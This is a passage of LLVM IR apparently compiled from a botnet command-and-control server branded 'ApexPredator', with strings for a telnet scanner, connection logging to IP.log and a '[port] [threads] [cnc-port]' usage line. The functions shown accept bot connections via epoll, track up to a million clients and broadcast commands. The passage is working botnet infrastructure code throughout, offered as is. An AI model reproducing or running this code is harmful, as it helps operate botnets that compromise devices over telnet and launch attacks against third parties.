@.str.197 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STARTED\0D\0A\00", align 1
@.str.198 = private unnamed_addr constant [15 x i8] c"!* SCANNER OFF\00", align 1
@.str.199 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STOPPED\0D\0A\00", align 1
@.str.200 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.201 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.202 = private unnamed_addr constant [4 x i8] c"CLS\00", align 1
@.str.203 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.204 = private unnamed_addr constant [5 x i8] c"EXIT\00", align 1
@.str.205 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.206 = private unnamed_addr constant [97 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] - Command:\1B[1;37m[\1B[0;36m%s\1B[1;37m]\0A\00", align 1
@.str.207 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.208 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Screening Error\00", align 1
@.str.209 = private unnamed_addr constant [62 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Incoming Connection From \00", align 1
@.str.210 = private unnamed_addr constant [7 x i8] c"IP.log\00", align 1
@.str.211 = private unnamed_addr constant [90 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Incoming Connection From [\1B[0;36m%d.%d.%d.%d\1B[1;37m]\0A\00", align 1
@.str.212 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.213 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.214 = private unnamed_addr constant [87 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\0A\00", align 1
@.str.215 = private unnamed_addr constant [111 x i8] c"\1B[1;31m\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Successfully Screened - Created By [\1B[0;36mFlexingOnLamers\1B[1;37m]\0A\00", align 1
@.str.216 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.217 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.218 = private unnamed_addr constant [7 x i8] c"STRING\00", align 1
@.str.220 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.221 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.222 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9

; <label>:37:                                     ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

; <label>:36:                                     ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

; <label>:59:                                     ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43

; <label>:62:                                     ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

; <label>:17:                                     ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias i8* @malloc(i64 %20) #7
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 %25, i32 1, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #7
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #7
  %31 = call %struct.tm* @localtime(i64* %9) #7
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #7
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

; <label>:35:                                     ; preds = %61, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %64

; <label>:38:                                     ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %59, label %42

; <label>:42:                                     ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 2
  %47 = load i8, i8* %46, align 1
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %60, label %49

; <label>:49:                                     ; preds = %42
  %50 = load i32, i32* %7, align 4
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %59, label %52

; <label>:52:                                     ; preds = %49
  %53 = load i32, i32* %12, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %54
  %56 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %55, i32 0, i32 1
  %57 = load i32, i32* %56, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %60, label %59

; <label>:59:                                     ; preds = %52, %49, %38
  br label %61

; <label>:60:                                     ; preds = %52, %42
  br label %61

; <label>:61:                                     ; preds = %60, %59
  %62 = load i32, i32* %12, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %12, align 4
  br label %35

; <label>:64:                                     ; preds = %35
  %65 = load i8*, i8** %8, align 8
  call void @free(i8* %65) #7
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @epollEventLoop(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.epoll_event, align 1
  %5 = alloca %struct.epoll_event*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr, align 2
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  store i8* %0, i8** %3, align 8
  %18 = call noalias i8* @calloc(i64 1000000, i64 12) #7
  %19 = bitcast i8* %18 to %struct.epoll_event*
  store %struct.epoll_event* %19, %struct.epoll_event** %5, align 8
  br label %20

; <label>:20:                                     ; preds = %216, %1
  %21 = load volatile i32, i32* @epollFD, align 4
  %22 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %23 = call i32 @epoll_wait(i32 %21, %struct.epoll_event* %22, i32 1000000, i32 -1)
  store i32 %23, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %24

; <label>:24:                                     ; preds = %213, %20
  %25 = load i32, i32* %8, align 4
  %26 = load i32, i32* %7, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %216

; <label>:28:                                     ; preds = %24
  %29 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %29, i64 %31
  %33 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 1
  %35 = and i32 %34, 8
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %55, label %37

; <label>:37:                                     ; preds = %28
  %38 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %38, i64 %40
  %42 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 1
  %44 = and i32 %43, 16
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %55, label %46

; <label>:46:                                     ; preds = %37
  %47 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %48 = load i32, i32* %8, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %47, i64 %49
  %51 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i32 0, i32 0
  %52 = load i32, i32* %51, align 1
  %53 = and i32 %52, 1
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %74, label %55

; <label>:55:                                     ; preds = %46, %37, %28
  %56 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %57 = load i32, i32* %8, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %56, i64 %58
  %60 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i32 0, i32 1
  %61 = bitcast %union.epoll_data* %60 to i32*
  %62 = load i32, i32* %61, align 1
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %63
  %65 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %64, i32 0, i32 2
  store i8 0, i8* %65, align 1
  %66 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %67 = load i32, i32* %8, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %66, i64 %68
  %70 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i32 0, i32 1
  %71 = bitcast %union.epoll_data* %70 to i32*
  %72 = load i32, i32* %71, align 1
  %73 = call i32 @close(i32 %72)
  br label %213

; <label>:74:                                     ; preds = %46
  %75 = load volatile i32, i32* @listenFD, align 4
  %76 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %77 = load i32, i32* %8, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %76, i64 %78
  %80 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i32 0, i32 1
  %81 = bitcast %union.epoll_data* %80 to i32*
  %82 = load i32, i32* %81, align 1
  %83 = icmp eq i32 %75, %82
  br i1 %83, label %84, label %137

; <label>:84:                                     ; preds = %74
  br label %85

; <label>:85:                                     ; preds = %129, %84
  store i32 16, i32* %10, align 4
  %86 = load volatile i32, i32* @listenFD, align 4
  %87 = call i32 @accept(i32 %86, %struct.sockaddr* %9, i32* %10)
  store i32 %87, i32* %11, align 4
  %88 = load i32, i32* %11, align 4
  %89 = icmp eq i32 %88, -1
  br i1 %89, label %90, label %100

; <label>:90:                                     ; preds = %85
  %91 = call i32* @__errno_location() #9
  %92 = load i32, i32* %91, align 4
  %93 = icmp eq i32 %92, 11
  br i1 %93, label %98, label %94

; <label>:94:                                     ; preds = %90
  %95 = call i32* @__errno_location() #9
  %96 = load i32, i32* %95, align 4
  %97 = icmp eq i32 %96, 11
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %94, %90
  br label %136

; <label>:99:                                     ; preds = %94
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0))
  br label %136

; <label>:100:                                    ; preds = %85
  %101 = bitcast %struct.sockaddr* %9 to %struct.sockaddr_in*
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %101, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 2
  %105 = load i32, i32* %11, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %106
  %108 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %107, i32 0, i32 0
  store i32 %104, i32* %108, align 4
  %109 = load i32, i32* %11, align 4
  %110 = call i32 @make_socket_non_blocking(i32 %109)
  store i32 %110, i32* %6, align 4
  %111 = load i32, i32* %6, align 4
  %112 = icmp eq i32 %111, -1
  br i1 %112, label %113, label %116

; <label>:113:                                    ; preds = %100
  %114 = load i32, i32* %11, align 4
  %115 = call i32 @close(i32 %114)
  br label %136

; <label>:116:                                    ; preds = %100
  %117 = load i32, i32* %11, align 4
  %118 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 1
  %119 = bitcast %union.epoll_data* %118 to i32*
  store i32 %117, i32* %119, align 1
  %120 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 0
  store i32 -2147483647, i32* %120, align 1
  %121 = load volatile i32, i32* @epollFD, align 4
  %122 = load i32, i32* %11, align 4
  %123 = call i32 @epoll_ctl(i32 %121, i32 1, i32 %122, %struct.epoll_event* %4) #7
  store i32 %123, i32* %6, align 4
  %124 = load i32, i32* %6, align 4
  %125 = icmp eq i32 %124, -1
  br i1 %125, label %126, label %129

; <label>:126:                                    ; preds = %116
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i32 0, i32 0))
  %127 = load i32, i32* %11, align 4
  %128 = call i32 @close(i32 %127)
  br label %136

; <label>:129:                                    ; preds = %116
  %130 = load i32, i32* %11, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %131
  %133 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %132, i32 0, i32 2
  store i8 1, i8* %133, align 1
  %134 = load i32, i32* %11, align 4
  %135 = call i64 @send(i32 %134, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i32 0, i32 0), i64 14, i32 16384)
  br label %85

; <label>:136:                                    ; preds = %126, %113, %99, %98
  br label %213

; <label>:137:                                    ; preds = %74
  %138 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %139 = load i32, i32* %8, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %138, i64 %140
  %142 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %141, i32 0, i32 1
  %143 = bitcast %union.epoll_data* %142 to i32*
  %144 = load i32, i32* %143, align 1
  store i32 %144, i32* %13, align 4
  %145 = load i32, i32* %13, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %146
  store %struct.clientdata_t* %147, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %148 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %149 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %148, i32 0, i32 2
  store i8 1, i8* %149, align 1
  br label %150

; <label>:150:                                    ; preds = %201, %137
  %151 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %151, i8 0, i64 2048, i32 16, i1 false)
  br label %152

; <label>:152:                                    ; preds = %184, %183, %178, %150
  %153 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %153, i8 0, i64 2048, i32 16, i1 false)
  %154 = icmp ne i8* %153, null
  br i1 %154, label %155, label %161

; <label>:155:                                    ; preds = %152
  %156 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %157 = load i32, i32* %13, align 4
  %158 = call i32 @fdgets(i8* %156, i32 2048, i32 %157)
  %159 = sext i32 %158 to i64
  store i64 %159, i64* %16, align 8
  %160 = icmp sgt i64 %159, 0
  br label %161

; <label>:161:                                    ; preds = %155, %152
  %162 = phi i1 [ false, %152 ], [ %160, %155 ]
  br i1 %162, label %163, label %187

; <label>:163:                                    ; preds = %161
  %164 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %165 = call i8* @strstr(i8* %164, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0)) #8
  %166 = icmp eq i8* %165, null
  br i1 %166, label %167, label %168

; <label>:167:                                    ; preds = %163
  store i32 1, i32* %15, align 4
  br label %187

; <label>:168:                                    ; preds = %163
  %169 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @trim(i8* %169)
  %170 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %171 = call i32 @strcmp(i8* %170, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %172 = icmp eq i32 %171, 0
  br i1 %172, label %173, label %179

; <label>:173:                                    ; preds = %168
  %174 = load i32, i32* %13, align 4
  %175 = call i64 @send(i32 %174, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i32 0, i32 0), i64 5, i32 16384)
  %176 = icmp eq i64 %175, -1
  br i1 %176, label %177, label %178

; <label>:177:                                    ; preds = %173
  store i32 1, i32* %15, align 4
  br label %187

; <label>:178:                                    ; preds = %173
  br label %152

; <label>:179:                                    ; preds = %168
  %180 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %181 = call i32 @strcmp(i8* %180, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0)) #8
  %182 = icmp eq i32 %181, 0
  br i1 %182, label %183, label %184

; <label>:183:                                    ; preds = %179
  br label %152

; <label>:184:                                    ; preds = %179
  %185 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %186 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* %185)
  br label %152

; <label>:187:                                    ; preds = %177, %167, %161
  %188 = load i64, i64* %16, align 8
  %189 = icmp eq i64 %188, -1
  br i1 %189, label %190, label %196

; <label>:190:                                    ; preds = %187
  %191 = call i32* @__errno_location() #9
  %192 = load i32, i32* %191, align 4
  %193 = icmp ne i32 %192, 11
  br i1 %193, label %194, label %195

; <label>:194:                                    ; preds = %190
  store i32 1, i32* %15, align 4
  br label %195

; <label>:195:                                    ; preds = %194, %190
  br label %202

; <label>:196:                                    ; preds = %187
  %197 = load i64, i64* %16, align 8
  %198 = icmp eq i64 %197, 0
  br i1 %198, label %199, label %200

; <label>:199:                                    ; preds = %196
  store i32 1, i32* %15, align 4
  br label %202

; <label>:200:                                    ; preds = %196
  br label %201

; <label>:201:                                    ; preds = %200
  br label %150

; <label>:202:                                    ; preds = %199, %195
  %203 = load i32, i32* %15, align 4
  %204 = icmp ne i32 %203, 0
  br i1 %204, label %205, label %210

; <label>:205:                                    ; preds = %202
  %206 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %207 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %206, i32 0, i32 2
  store i8 0, i8* %207, align 1
  %208 = load i32, i32* %13, align 4
  %209 = call i32 @close(i32 %208)
  br label %210

; <label>:210:                                    ; preds = %205, %202
  br label %211

; <label>:211:                                    ; preds = %210
  br label %212

; <label>:212:                                    ; preds = %211
  br label %213

; <label>:213:                                    ; preds = %212, %136, %55
  %214 = load i32, i32* %8, align 4
  %215 = add nsw i32 %214, 1
  store i32 %215, i32* %8, align 4
  br label %24

; <label>:216:                                    ; preds = %24
  br label %20
                                                  ; No predecessors!
  %218 = load i8*, i8** %2, align 8
  ret i8* %218
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @make_socket_non_blocking(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

; <label>:10:                                     ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.219, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %21

; <label>:11:                                     ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.219, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %21

; <label>:20:                                     ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

; <label>:21:                                     ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

declare i32 @printf(i8*, ...) #1

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

; <label>:3:                                      ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

; <label>:6:                                      ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 2
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

; <label>:13:                                     ; preds = %6
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

; <label>:17:                                     ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3

; <label>:20:                                     ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define i8* @titleWriter(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
